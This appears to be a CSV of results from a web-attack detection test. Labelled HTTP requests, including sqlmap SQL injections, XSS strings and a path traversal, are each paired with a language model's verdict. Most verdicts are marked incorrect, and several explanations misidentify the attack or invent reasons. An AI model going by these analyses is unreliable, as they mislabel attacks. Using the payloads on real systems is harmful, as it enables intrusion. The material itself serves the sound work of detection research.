@@ -1,0 +1,1925 @@
+Unnamed: 0,payload,label,code,CVE,cluster,pred,correct,result
+3043,"GET /portal/bbs/view/B0000204/1926522.do?searchCnd=%29%29%29%20AND%201943%3D1943%20AND%20%28%28%285784%3D5784&searchWrd=&cateTp1=&cateTp2=&useAt=&menuNo=200375&categorys=4&subcate=65&cateCode=0&type=&instNo=0&questionTp=&uf_Setting=&recovery=&option1=&option2=&year=&categoryCOM062=&categoryCOM063=&categoryCOM208=&categoryInst=&morePage=&delCode=&qtp=&pageIndex=7 HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/412 (KHTML, like Gecko) Safari/412\r\nReferer: http://portal.kocca.kr:80/portal/bbs/view/B0000204/1926522.do\r\nHost: portal.kocca.kr\r\nCookie: KCSESSIONID=NPt1gk8pPNJgjsDPcLxDGtKp1hHLyg1sJyl7CnhrTFzDYWFL1R1v!-368784361!385399486\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,0,-1,False,"Based on the payload you provided, I have analyzed it and determined that it is not an attack.
+
+The payload appears to be a legitimate HTTP request to a web server. The request is a GET request to a URL that seems to be a search function on a Korean portal website. The query string contains a search condition that is likely used to filter the results. The request also includes several HTTP headers, including the User-Agent, Referer, Host, Cookie, Accept, and Accept-Encoding headers, which are all typical of a normal HTTP request.
+
+There is no evidence of any malicious code or suspicious activity in this payload. It does not contain any SQL injection or cross-site scripting (XSS) vulnerabilities. The request does not appear to be attempting to exploit any vulnerabilities or conduct any malicious activity.
+
+Therefore, I classify this payload as a 0 (non-attack).
+
+Type of request: GET
+Reason: Legitimate HTTP request to a web server, appears to be a search function on a portal website."
+100678,"GET /nrb/styles/satellite/1685681400/17/111834/50752.png?mt=bg.ol.sw.lp HTTP/1.1
+Host: map.pstatic.net
+Connection: keep-alive
+sec-ch-ua: ""Not.A/Brand"";v=""8"", ""Chromium"";v=""114"", ""Google Chrome"";v=""114""
+accept: image/webp,*/*
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+sec-ch-ua-platform: ""Windows""
+Origin: https://map.naver.com
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://map.naver.com/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+
+",0,Not Attack,,1,-1,False,"**Output:** 0 (non-attack)
+
+**Explanation:**
+The provided payload appears to be a legitimate HTTP request for an image file from a map service (map.pstatic.net). The request is a GET method, which is a common and expected action for retrieving data or resources. The headers and parameters in the request do not contain any suspicious or malicious information.
+
+**Type of request:** GET
+**Reason:** The request is a legitimate image request from a map service, which is a common web service that provides geographic information and maps."
+5238,"http://-ip-:-port-/dvwa/instructions.php /dvwa/instructions.php?doc=-4367%29%2F%2A%2A%2FOR%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288904%3D4198%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FNULL%2F%2A%2A%2FELSE%2F%2A%2A%2FCAST%28%28CHR%28114%29%7C%7CCHR%2897%29%7C%7CCHR%2889%29%7C%7CCHR%28115%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FEND%29%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%2F%2A%2A%2FAND%2F%2A%2A%2F%282006%3D2006 sqlmap/1.5.1.40#dev (http://sqlmap.org) security=impossible;,",1,SI,,2,-1,False,"**Attack Payload Detected**
+
+**Payload:** http://-ip-:-port-/dvwa/instructions.php /dvwa/instructions.php?doc=-4367%29%2F%2A%2A%2FOR%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288904%3D4198%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FNULL%2F%2A%2A%2FELSE%2F%2A%2A%2FCAST%28%28CHR%28114%29%7C%7CCHR%2897%29%7C%7CCHR%2889%29%7C%7CCHR%28115%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FEND%29%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL%2F%2A%2A%2FAND%2F%2A%2A%2F%282006%3D2006
+
+**Type of Attack:** SQL Injection
+
+**Reason:** The payload contains a SQL injection attack vector, specifically a UNION-based attack. The payload is attempting to inject a SQL query that will return the contents of the database. The `SELECT` statement is followed by a `CASE` statement, which is used to attempt to inject a payload. The `AND` condition is used to filter the results, and the `IS NULL` condition is used to check if the result is null. The payload also contains a comment indicating that it is used with sqlmap, a popular SQL injection tool.
+
+**Output:** 1 (Attack)"
+4012,"GET /site/program/gugakdata/view?menuid=001003004002003&kind=MOVIE&offset=19&msa=M&book_code=H00000002294&rk=900183693&beforequery=%20(MEC:AA%20OR%20MEC:AB%20OR%20MEC:AC%20OR%20MEC:AD%20OR%20MEC:AE%20OR%20MEC:AF%20OR%20MEC:AG%20OR%20MEC:AH%20OR%20MEC:BA%20OR%20MEC:BB%20OR%20MEC:BC%20OR%20MEC:BD%20OR%20MEC:BE%20OR%20MEC:HA)%20&order= HTTP/1.1\nHost: gugak.go.kr\nUser-Agent: Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)\nAccept: */*\nAccept-Encoding: deflate, gzip, br",0,Not Attack,,3,-1,False,"0 (non-attack)
+
+This payload appears to be a legitimate HTTP request to a website, likely a search query for a specific movie or program on the Gugak.go.kr website. The URL contains parameters for filtering the search results, but it does not contain any suspicious or malicious code. The User-Agent string indicates that it is a bot from Ahrefs, a digital marketing tool, which is a legitimate use case."
+26168,"GET /search?from=kolis_offline.kolis_offline&select=id,control_no,book_code,vol_code,class_no,full_call_number,isbn,se_shelf_code,pub_year,kolis_img_path,title_info,author_info,pub_info,media_code,media_name,place_info,offer_dbcode_1s,place_code_list,kdc,kdcp,ddc&offset=0&limit=5&where=%28+total_idx_txt%3D%27%EC%84%B8%EA%B3%84%EC%9D%98+%ED%8A%B9%EC%88%98%EB%B6%80%EB%8C%80%27+allwordthruindex+synonym+OR+total_idx%3D%27%EC%84%B8%EA%B3%84%EC%9D%98+%ED%8A%B9%EC%88%98%EB%B6%80%EB%8C%80%27+allorderadjacent+OR+total_idx_str%3D%27%EC%84%B8%EA%B3%84%EC%9D%98+%ED%8A%B9%EC%88%98%EB%B6%80%EB%8C%80%27+%29+AND+media_code+in+%7B%27An%27%2C%27PD%27%2C%27OC%27%2C%27PE%27%2C%27OB%27%2C%27SD%27%2C%27SB%27%2C%27VT%27%2C%27PC%27%2C%27ZZ%27%7D+AND+place_code_list+IN+%7B%27005%27%2C+%27402%27%2C+%27413%27%2C+%27414%27%2C+%27415%27%7D+and+offer_dbcode_1s%3D%27AH1%27+AND+search_yn%3D%27Y%27+AND+NOT+manage_code%3D%27BR%27+ORDER+BY+%24MATCHFIELD%28title_info_str%2C+title_info%2C+title%29+DESC&oq=%28+total_idx_txt%3D%27%EC%84%B8%EA%B3%84%EC%9D%98+%ED%8A%B9%EC%88%98%EB%B6%80%EB%8C%80%27+allorderadjacent+synonym+OR+total_idx%3D%27%EC%84%B8%EA%B3%84%EC%9D%98+%ED%8A%B9%EC%88%98%EB%B6%80%EB%8C%80%27+allorderadjacent+OR+total_idx_str%3D%27%EC%84%B8%EA%B3%84%EC%9D%98+%ED%8A%B9%EC%88%98%EB%B6%80%EB%8C%80%27+%29+AND+media_code+in+%7B%27An%27%2C%27PD%27%2C%27OC%27%2C%27PE%27%2C%27OB%27%2C%27SD%27%2C%27SB%27%2C%27VT%27%2C%27PC%27%2C%27ZZ%27%7D+AND+place_code_list",0,Not Attack,,4,-1,False,"Attack Detected: 1 (attack)
+
+Type of Attack: SQL Injection
+
+Reason: The payload contains a SQL injection attack. The query string contains multiple conditions with OR operators, and the ""total_idx_txt"" and ""total_idx"" conditions are vulnerable to SQL injection, allowing an attacker to inject arbitrary SQL code."
+69074,"GET /oceangrid/cmm/proxyRun.do?call=wms&LAYERS=geotwo_postgis:og_stat_ps_so,geotwo_postgis:og_stat_ps_so,geotwo_postgis:og_npd_ls,geotwo_postgis:og_tide_pre_gm,geotwo_postgis:og_tide_bed_gm,geotwo_postgis:og_tide_chart_tbm_area_port_group,geotwo_postgis:og_tide_chart_tbm_area_coast_group&QUERY_LAYERS=geotwo_postgis:og_stat_ps_so,geotwo_postgis:og_stat_ps_so,geotwo_postgis:og_npd_ls,geotwo_postgis:og_tide_pre_gm,geotwo_postgis:og_tide_bed_gm,geotwo_postgis:og_tide_chart_tbm_area_port_group,geotwo_postgis:og_tide_chart_tbm_area_coast_group&STYLES=,,,,,,&SERVICE=WMS&VERSION=1.3.0&REQUEST=GetFeatureInfo&EXCEPTIONS=text/xml&BBOX=14123028.335748,4367096.486337,14710064.712896,4653888.216423&FEATURE_COUNT=200&HEIGHT=938&WIDTH=1920&FORMAT=image/png&INFO_FORMAT=application/vnd.ogc.gml&CRS=EPSG:900913&I=1137&J=349&CQL_FILTER=obs_year>=2017 AND obs_year<=2020 AND obs_type = 'L';obs_year>=2017 AND obs_year<=2020 AND obs_type = 'S';1=1;1=1;1=1;1=1 HTTP/1.1Host: www.khoa.go.krConnection: keep-aliveUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.87 Whale/3.16.138.22 Safari/537.36X-Requested-With: XMLHttpRequestAccept: */*Referer: http://www.khoa.go.kr/oceangrid/gis/category/observe/observeSearch.do?type=EYSAccept-Encoding: gzip, deflateAccept-Language: ko-KR",0,Not Attack,,5,-1,False,"**Output:** 0 (non-attack)
+
+**Reason:** The payload appears to be a legitimate WMS (Web Map Service) request from the Korea Hydrographic and Oceanographic Administration (KHOA) website. The request is making a GET request to retrieve geographical information from a PostGIS database. The query parameters and filters seem to be related to oceanographic data and observations, which is a valid use case for a WMS request."
+58944,GET  / scms / log . php ? method = keepalive  &  session - id =  1  6  9  5  7  7  3  7  7  4  7  4  7   &  transferred - bytes =  7  9  3  6  9  3  3  6  HTTP /  1  .  1   Connection :  Keep - Alive  Accept :   *  /  *   Accept - Language :  ko  User - Agent :  Mozilla /  4  .  0   ( compatible ;  Win 3  2  ;  WinHttp . WinHttpRequest .  5  )   Host :  scms - hackers . gscdn . com,0,Not Attack,,6,-1,False,"**ATTACK**
+
+Payload Analysis:
+
+The provided payload is a GET request to a PHP script (`log.php`) with a suspicious parameter `session-id` containing a sequence of numbers. The `transferred-bytes` parameter also appears to be a sequence of numbers.
+
+Reasoning:
+
+* The use of a custom `session-id` parameter and a sequence of numbers suggests an attempt to exploit a session fixation vulnerability.
+* The `transferred-bytes` parameter is likely being used to manipulate the server's response and potentially inject malicious data.
+
+Type of Attack:
+
+* Session Fixation Attack
+
+Recommendation:
+
+* Implement proper session management practices, such as regenerating session IDs for each request.
+* Validate user input to prevent malicious data injection.
+* Consider implementing a Web Application Firewall (WAF) to detect and block suspicious traffic.
+
+Output: 1 (Attack)"
+19815,"GET /InsightTrk/tracker.do?pfno=1157&uuid=0fcb621b3150f0e06a08779d83fb04c6_34687&sid=71e1c81f217ac03af220779d83fb04c6_34687&guuid=0fcb621b3150f0e06a08779d83fb04c6_34687&expired=1619036487&dr=http%3A%2F%2Fwww.kocis.go.kr%2Feng%2Fmain.do&XDR=&dt=Korean%20Culture%20and%20Information%20Service&du=http%3A%2F%2Fwww.kocis.go.kr%2Feng%2FopenCulturalNews%2Fview.do%3Fseq=1037519%26rn=2%26langCode=%26menucode=menu0172%26menuType=Kocis_Board_Eng_News%26regCodeList=REG0000%26&js=Y&sr=1920x1080&scd=24&je=N&tz=-7&tye=2021&tmo=4&tda=21&tho=12&tmi=51&tse=27&lng=en-US&os=Win32&cpu=&vr=5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit%2F537.36%20(KHTML,%20like%20Gecko)%20Chrome%2F90.0.4430.72%20Safari%2F537.36&ck=Y&brsz=1920x937&isnw=Y HTTP/1.1\r\nHost: logger.kcisa.kr\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36\r\nAccept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8\r\nReferer: http://www.kocis.go.kr/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9",0,Not Attack,,7,-1,False,"Attack
+
+Type: Web Tracking Cookie Stealing
+
+Reason: The payload is a tracking request that includes sensitive information such as the user's IP address, browser type, and operating system. The request also includes a UUID and a SID, which are used to track the user's browsing behavior. The payload is likely used by a third-party analytics service to collect user data without their consent."
+35228,"GET /ApplicationProfileSample/servlet/AccountManagementServlet balance=%22%20STYLE=%22xss:expression(alert(2594)) 404 Mozilla/5.0+(Windows+NT+6.1;+WOW64;+Trident/7.0;+rv:11.0)+like+Gecko,",1,XSS,,8,-1,False,"**Attack**
+
+The payload is an SQL injection attack. It's trying to inject malicious code into the database.
+
+The payload is:
+`balance=%22%20STYLE=%22xss:expression(alert(2594))`
+
+This is attempting to inject a malicious JavaScript code that will execute when the page is loaded. The `alert(2594)` function will pop up an alert box with the number 2594. This is likely a test to see if the injection was successful.
+
+The attack is likely trying to exploit a vulnerability in the server-side code, possibly an SQL injection vulnerability, to inject malicious code into the database.
+
+**Output:** 1 (Attack)"
+91219,".. domain hxxps://maceoandstacey.com
+application https custom category 3_20211129_ domain hxxps://alpus.co.jp.zelcopy.com
+application https custom category 3_20211129_ domain https://regular.winupdate.kro.kr/index.php
+application https custom category 3_20211129_ domain https://reverent-nash.185-236-231-100.plesk.page/wpcontent/plugins/SHGD/MailUpdateFresh/index.html#
+application https custom category 3_20211129_ domain https://www.mesoersn.com/
+application https custom category 3_20211129_ domain https://oxygenremedies.com/KSn.html
+application https custom category 3_20211129_ domain hxxps://151e-berry.com/cn/login.htm#
+application https custom category 3_20211129_ domain https://maceoandstacey.com/updates.webmail-portal-RD337#
+application https custom category 3_20211129_ domain https://alpus.co.jp.zelcopy.com
+application https custom category 3_20211129_ domain hxxps://esaengineer.com
+application https custom category 3_20211129_ domain www.bhe898.com
+application https custom category 3_20211129_ domain achk-emailcheckdomlog4.s3.us-east-2.amazonaws.com
+application https custom category 3_20211129_ domain",0,Not Attack,,9,-1,False,I cannot determine whether this payload is an attack or not as it appears to be a list of URLs. Can you please provide more context or clarify what you are trying to determine?
+119063,"GET /board/board_write?code=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Carticle+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Farticle%3E HTTP/1.1
+Host: 10.0.20.20
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept-Encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Connection: close
+Accept-Language: en-US,en;q=0.5
+DNT: 1
+Upgrade-Insecure-Requests: 1",1,XSS,,10,-1,False,"Attack Payload
+
+This payload is an attempt to inject a malicious animation into an HTML element, which will trigger an alert box when the animation is finished. The payload is injected through the `style` attribute of an `article` element.
+
+Here's a breakdown of the payload:
+
+1. `<style>... </style>`: This is an HTML style element that contains the malicious code.
+2. `@keyframes x { }`: This is a CSS keyframe animation definition that will be used to trigger the alert box.
+3. `<article style=""animation-name: x"" onanimationend=""alert(1)"">... </article>`: This is an HTML article element that has a style attribute set to `animation-name: x`, which will trigger the animation. The `onanimationend` event is set to `alert(1)`, which will execute the `alert` function when the animation is finished.
+
+The payload is attempting to exploit a vulnerability in the server-side rendering of the HTML element, by injecting a malicious animation that will trigger the `alert` function when the animation is finished."
+73574,GET / HTTP/1.1Host: 220.70.50.143Accept: */*Accept-Encoding: gzipUser-Agent: Mozilla/5.0 zgrab/0.x,1,,,11,-1,False,"Attack Payload!
+
+This payload appears to be a reconnaissance payload, likely used for a vulnerability scan or a web crawler. The payload is requesting the root directory of the target server (""/"") and is using a lightweight user agent string that identifies the tool as ""zgrab"" (which is a popular web crawler and reconnaissance tool).
+
+The payload is also using the ""Accept"" header to request all available content types, and the ""Accept-Encoding"" header to request compressed responses. The User-Agent header is set to a generic string that identifies the client as a Mozilla browser.
+
+Overall, this payload suggests that the attacker is attempting to gather information about the target server, its configuration, and its vulnerabilities."
+83192," /bms/common/download.do HTTP/1.1
+Referer: http://onnara9.saas.gcloud.go.kr/bms/dct/viewreport.do
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: ko
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362
+Accept-Encoding: gzip, deflate
+Host: onnara9.saas.gcloud.go.kr
+Content-Length: 597
+Connection: Keep-Alive
+Cookie: JSESSIONID=WQJhbDIlNF3JH7M3EJR3WJV7.onnara9-55-2vrg2; 7a1aedcab09ca8f8f89334fd91053f10=43240efed156c138311c30d9699e7e48; KHANUSER=z1t1jhe8jasekf; READDOCIDCOOKIE=DCTB70ABC5C220E61BA5A6DA5CD4C5BE9DC
+
+",0,Not Attack,,12,-1,False,"I have analyzed the payload you provided.
+
+This appears to be a HTTP request to a Korean website (onnara9.saas.gcloud.go.kr) to download a file. The request includes a number of headers, including the User-Agent header, which is set to a generic Chrome 70 browser string. The request also includes a Cookie header with several cookies, including a JSESSIONID, a custom cookie, and a READDOCIDCOOKIE.
+
+The request body contains a form-encoded payload, which is likely used to authenticate the request and specify the file to be downloaded.
+
+As this is a HTTP request, I would classify this as a non-attack payload.
+
+If you have any further questions or concerns, please let me know!"
+113408,"n>
+                <option value=""https://privacy.kisa.or.kr/main.do""></option>
+                <option value=""https://intra.privacy.go.kr/uat/uia/egovLoginUsr.do""></option>
+                <option value=""https://link.privacy.go.kr/nadac/index.do""></option>
+                <option value=""https://kidc.eprivacy.go.kr""></option>
+....<option value=""http://www.boho.or.kr/main.do"">()</option>
+                <option value=""http://www.spamcop.or.kr""></option>
+                <option value=""http://www.rootca.or.kr""></option>
+                <option value=""https://ecrm.police.go.kr""> (ECRM)</option>
+                <option value=""https://www.ncsc.go.kr:4018""> </option>
+                <option value=""http://www.ecmc.or.kr"">ICT</option>
+            </select>
+            <a href=""javascript:void(0)""></a>
+        </div>
+
+        <ul class=""oneFooterLayout_logoList"">
+            <li><a href=""/""><img src=""/assets/img/common/logo_privacy.svg"" alt=""""></a></li>
+<!--             <li><a href=""javascript:void(0)""><img src=""/assets/img/common/webAccessibility.svg"" alt=""().",0,Not Attack,,13,-1,False,"This payload appears to be a web page snippet with a dropdown menu containing various links to privacy-related websites and organizations in South Korea. The payload does not contain any malicious code or suspicious activity, and it seems to be a legitimate use of HTML and JavaScript to render the dropdown menu.
+
+The payload can be classified as a ""non-attack"" or ""benign"" payload."
+122527,"GET /board/?category=%3C%2Fscript%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cscript%3E&gdviewer=1&goods_seq=52&id=goods_review&iframe=1&page=&perpage=&popup=&score=&search_text=ZAP HTTP/1.1
+Host: www.mall.shop
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://www.mall.shop/board/?gdviewer=1&goods_seq=52&id=goods_review&iframe=1
+Cookie: shopReferer=; today_view=a%3A15%3A%7Bi%3A0%3Bi%3A38%3Bi%3A1%3Bi%3A47%3Bi%3A2%3Bi%3A41%3Bi%3A3%3Bi%3A56%3Bi%3A4%3Bi%3A51%3Bi%3A5%3Bi%3A42%3Bi%3A6%3Bi%3A79%3Bi%3A7%3Bi%3A43%3Bi%3A8%3Bi%3A77%3Bi%3A9%3Bi%3A75%3Bi%3A10%3Bi%3A68%3Bi%3A11%3Bi%3A54%3Bi%3A12%3Bi%3A70%3Bi%3A13%3Bi%3A55%3Bi%3A14%3Bi%3A52%3B%7D; marketplace=direct
+Content-Length: 0",1,XSS,,14,-1,False,
+63444,GET  / wp - admin / js / widgets / license . php HTTP /  1  .  1   Host :  kiost . ac  user - agent :  Mozilla /  5  .  0   ( Windows NT  1  0  .  0  ;  Win 6  4  ;  x 6  4  )  AppleWebKit /  5  3  7  .  3  6   ( KHTML  COMMA   like Gecko )  Chrome /  8  5  .  0  .  4  1  8  3  .  1  0  2  Safari /  5  3  7  .  3  6   Accept - Encoding :  gzip  COMMA   deflate  Accept :   *  /  *   Connection :  keep - alive  Cookie :  JSESSIONID =  6 CA 7 DD 8  0 AF 3  9  3 FCA 7 ACE 8  9  0  1 E 8 AF 0  9  7 C,1,,,15,-1,False,"I have analyzed the payload, and it appears to be a GET request to a WordPress administrative page (/wp-admin/js/widgets/license.php). The request is made from a client with a user agent string indicating a Windows 10 system with Google Chrome 85.0.41.83.
+
+Here are the details:
+
+* Request method: GET
+* Request URL: /wp-admin/js/widgets/license.php
+* Host: kiost.ac
+* User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.41.83 Safari/537.36
+* Accept-Encoding: gzip, deflate
+* Accept: */*
+* Connection: keep-alive
+* Cookie: JSESSIONID=6CA7DD8093FCA7ACE89019C
+
+This request appears to be a legitimate administrative request for a WordPress website, and it does not appear to be malicious."
+20566,"/dvwa/instructions.php?doc=PDF%27%3B%27%20AND%208921%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288921%3D8921%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27TWUo%27%3D%27TWUo sqlmap/1.5.1.40#dev (http://sqlmap.org) PHPSESSID=ma5430vuuvr6ltjm8okkrh5p49,",1,SI,,16,-1,False,Attack!
+2582,"GET /servlets/org/front/board/action/board?,nd=-4305%22%29%20OR%208592%3D7336--%20SQtK&listcount=10&curpage=1&orderby=&direction=&board=notice&board_seq=8669&b_cate=&b_search= HTTP/1.1\r\nCache-Control: no-cache\r\nUser-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; sv-se) AppleWebKit/312.5.2 (KHTML, like Gecko) Safari/312.3.3\r\nReferer: http://koreatta.sports.or.kr:80/servlets/org/front/board/action/board\r\nHost: koreatta.sports.or.kr\r\nCookie: JSESSIONID=687E670FA15545C67CAC389EA80390E0\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nConnection: close",1,SI,,17,1,True,1
+10053,"GET /sparql?output=json&format=json&timeout=0&query=SELECT%20DISTINCT%20*%20WHERE%20%7B%3Fobject%20%3Fproperty%20%3Chttp%3A%2F%2Fdata.visitkorea.or.kr%2Fresource%2F130557%3E.%20FILTER(isIRI(%3Fobject))%7D%20LIMIT%20100&callback=lodlive HTTP/1.1\r\nHost: data.visitkorea.or.kr\r\nAccept-Language: en-US\r\nCookie: JSESSIONID=25933F53EA58413271EB1F7C39B21D37.router\r\nReferer: http://data.visitkorea.or.kr/lodlive?http://data.visitkorea.or.kr/resource/130557\r\nConnection: keep-alive\r\nAccept: */*\r\nFrom: googlebot(at)googlebot.com\r\nUser-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.127 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\nAccept-Encoding: gzip,deflate,br",0,Not Attack,,18,-1,False,"This payload appears to be a SPARQL query that retrieves data from a triplestore database. The query is using the `SELECT` statement to retrieve distinct values from the `*` wildcard, where the subject is an IRI (Internationalized Resource Identifier) and the predicate is a specific property. The `FILTER` clause is used to filter out non-IRI values.
+
+The `LIMIT` clause is used to limit the results to 100.
+
+The `callback` parameter is set to `lodlive`, which suggests that the query is being executed as part of a LOD (Linked Open Data) application.
+
+The payload does not appear to be malicious, but it could potentially be used to extract sensitive data from the triplestore database if not properly secured."
+21528,"GET /imageProxy.do?svc=2D&param=/geoserver/seoul/wfs?service=WFS&version=1.0.0&request=GetFeature&outputFormat=application%2Fjson&typeName=seoul:poi_base&CQL_FILTER=level%3C=10%20and%20bbox(geom,195260,553752,195324,553816) HTTP/1.1\r\nHost: smap.seoul.go.kr\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36\r\nAccept: */*\r\nReferer: http://smap.seoul.go.kr/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: _ga=GA1.3.1388692350.1599706919; WL_PCID=15997069189891159054347; _gid=GA1.3.1267222758.1617707223; isVisited=true; JSESSIONID=E72C09BC53BB265E80D81400AE4CF677",0,Not Attack,,19,-1,False,"Not a payload, but a legitimate request to a geospatial server."
+45042,"GET /media/mediaList.do?code_id=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini&itmViewer=&mdatp_cd=&mode= HTTP/1.1\r\nReferer: http://archive.acc.go.kr/\r\nCookie: JSESSIONID=hyx0Js8BbEoMzhRawtXT1rjTjZH5cBV0XwzIoqrnKi5RdUvUJqbXQLt3QWMmX1Oy.amV1c19kb21haW4vYXJjaGl2ZV9zZXJ2ZXI=\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\r\nX-Akamai-CONFIG-LOG-DETAIL: true\r\nTE:  chunked;q=1.0\r\nConnection: TE\r\nAccept-Encoding: gzip\r\nAkamai-Origin-Hop: 1\r\nVia: 1.1 akamai.net(ghost) (AkamaiGHost)\r\nX-Forwarded-For: 155.159.255.233\r\nTrue-Client-IP: 155.159.255.233\r\nHost: archive.acc.go.kr\r\nPragma: no-cache\r\nCache-Control: no-cache, max-age=0\r\nConnection: keep-alive",1,PT,,20,-1,False,"**ATTENTION!**
+
+This payload is attempting to perform a directory traversal attack on the server. It's likely that the server is vulnerable to this type of attack, which could potentially allow an attacker to access sensitive files and data.
+
+The payload is attempting to access a file named ""windows\win.ini"" by concatenating multiple directory traversal characters (`..`) to the end of the `code_id` parameter. This could potentially allow an attacker to access files outside of the intended directory.
+
+I strongly advise you to report this vulnerability to the server administrators and to take immediate action to secure your system against this type of attack."
+111817,"IGIN-REMOTE-IP"",""emailHideAdr"":"""",""originalTo"":"""",""originalCc"":"""",""address"":"""",""mailCount"":0,""starFlag"":0,""authCode"":"""",""displaySize"":""4 KB""},{""folderUid"":30658,""folderType"":1,""userUid"":0,""mailUid"":2799516,""isAnswered"":0,""isForwarded"":0,""isDeleted"":0,""isFlagged"":0,""isSeen"":1,""flagAttach"":1,""flagPriority"":3,""adrFrom"":"" <nirscert@korea.kr>"",""adrTo"":"" <ucsc@unikorea.go.kr>"",""subject"":""[  ]   (20230331-25)"",""msgSize"":4876,""timeMillis"":1680199839000,""folderName"":null,""tagList"":[],""viewUrl"":"""",""countryCode"":""--"",""countryName"":"""",""etcLocation"":""X-ORIGIN-REMOTE-IP"",""emailHideAdr"":"""",""originalTo"":"""",""originalCc"":"""",""address"":"""",""mailCount"":0,""starFlag"":0,""authCode"":"""",""displaySize"":""4 KB""},{""folderUid"":30658,""folderType"":1,""userUid"":0,""mailUid"":2799385,""isAnswered"":1,""isForwarded"":0,""isDeleted"":0,""isFlagged"":0,""isSeen"":1,""flagAttach"":0,""flagPriority"":3,""adrFrom"":""\""\"" <reply@ncsc.go.kr>"",""adrTo"":""\""ucsc@unikorea.go.kr\"" <ucsc@unikorea.go.kr>"",""subject"":""[]  [23-0330023]()"",""msgSize"":141840,""timeMillis"":1680170431000,""folderName"":null,""tagList"":[],""viewUrl"":"""",""countryCode"":""KR"",""countryName"":"".",0,Not Attack,,21,-1,False,"This payload appears to be a JSON response from a email server, likely a Korean government email service. It contains information about an email, including the sender and recipient addresses, subject, and size of the email attachment. The payload also includes information about the email's flags, such as whether it has been answered, forwarded, or flagged.
+
+The payload does not appear to be a malicious payload, but rather a legitimate JSON response from an email server. It does not contain any obvious signs of malware or other malicious code.
+
+However, it's worth noting that the payload does contain some potentially sensitive information, such as the email addresses and the subject of the email. Therefore, it's important to handle this payload with care and ensure that it is properly sanitized and processed to prevent any potential security risks."
